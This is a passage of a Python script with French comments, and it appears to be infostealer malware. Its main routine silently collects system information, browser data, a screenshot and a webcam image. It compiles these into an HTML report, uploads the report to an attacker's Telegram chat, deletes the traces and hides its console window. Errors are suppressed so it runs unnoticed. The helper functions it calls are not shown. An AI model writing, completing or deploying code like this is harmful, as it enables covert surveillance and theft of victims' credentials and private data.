    """Convertit une image en base64"""
    try:
        if image_path and os.path.exists(image_path):
            with open(image_path, "rb") as img_file:
                return base64.b64encode(img_file.read()).decode('utf-8')
    except:
        pass
    return ""

def send_to_telegram(file_path, caption):
    """Envoie un fichier via Telegram silencieusement"""
    try:
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, 'rb') as f:
                requests.post(
                    TELEGRAM_API_URL,
                    files={'document': f},
                    data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption},
                    timeout=30
                )
            return True
    except:
        pass
    return False

def main():
    """Fonction principale silencieuse"""
    try:
        # Installation silencieuse des dépendances
        install_dependencies_silent()
        
        # Collecte des données système
        system_info = get_system_info()
        
        # Extraction des données navigateurs
        browser_data = extract_all_browser_data()
        
        # Capture des médias
        screenshot_path = capture_screenshot()
        webcam_path = capture_webcam()
        
        media_files = {
            'screenshot': screenshot_path,
            'webcam': webcam_path
        }
        
        # Création du rapport HTML
        report_path = create_comprehensive_html_report(system_info, browser_data, media_files)
        
        # Envoi vers Telegram
        if report_path and os.path.exists(report_path):
            caption = f"📊 Rapport complet - {system_info.get('Système', {}).get('Utilisateur', 'Unknown')} - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
            send_to_telegram(report_path, caption)
        
        # Nettoyage silencieux
        try:
            if screenshot_path and os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            if webcam_path and os.path.exists(webcam_path):
                os.remove(webcam_path)
        except:
            pass
            
    except Exception as e:
        pass  # Échec silencieux

if __name__ == "__main__":
    # Exécution silencieuse sans console
    if getattr(sys, 'frozen', False):
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    main()